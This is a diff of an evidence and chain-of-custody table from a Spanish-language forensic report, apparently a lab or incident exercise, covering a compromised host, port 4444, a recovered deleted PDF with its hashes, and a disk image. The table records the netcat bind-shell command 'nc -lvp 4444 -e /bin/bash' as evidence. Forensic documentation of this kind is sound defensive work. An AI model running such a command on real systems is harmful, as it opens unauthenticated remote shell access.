@@ -23,17 +23,29 @@ Recuperación de la evidencia: Se localizó la entrada de directorio no asignada
 📊 Tabla de Evidencias y Cadena de Custodia
 ---------------------------------------------------------------------------------------
 Parámetro / Componente Detalles de la Evidencia 
-IP Atacante / Listener192.168.1.100   
-IP Víctima / Objetivo192.168.1.101   
-Puerto Comprometido4444 (TCP)   
-Comando Maliciosonc -lvp 4444 -e /bin/bash   
-Dispositivo de Almacenamiento/dev/sdb1 (Formato FAT32)   
-Archivo EliminadoPlan_Estrategico.pdf (_LAN_E~1.PDF)   
+
+IP Atacante / Listener192.168.1.100  
+
+IP Víctima / Objetivo192.168.1.101  
+
+Puerto Comprometido4444 (TCP)  
+
+Comando Maliciosonc -lvp 4444 -e /bin/bash  
+
+Dispositivo de Almacenamiento/dev/sdb1 (Formato FAT32) 
+
+Archivo EliminadoPlan_Estrategico.pdf (_LAN_E~1.PDF)  
+
 Tamaño del Archivo612,108 bytes   
+
 Hash MD5 del Contenido Recuperado3cc93ebe0572d0e22124be471aadf286   
-Hash SHA-1 del Contenido Recuperado08a34a566b1459fe3c020c90d7c1c067b083ec16   
+
+Hash SHA-1 del Contenido Recuperado08a34a566b1459fe3c020c90d7c1c067b083ec16  
+
 Imagen Forense Generadaevidencia_caso.dd (vía Guymager)   
+
 Herramientas UtilizadasNetcat, ss, htop, pfSense, Guymager, Autopsy   
+
 Estado de Recuperación✅ Completado y Verificado
 ---------------------------------------------------------------------------------------
 
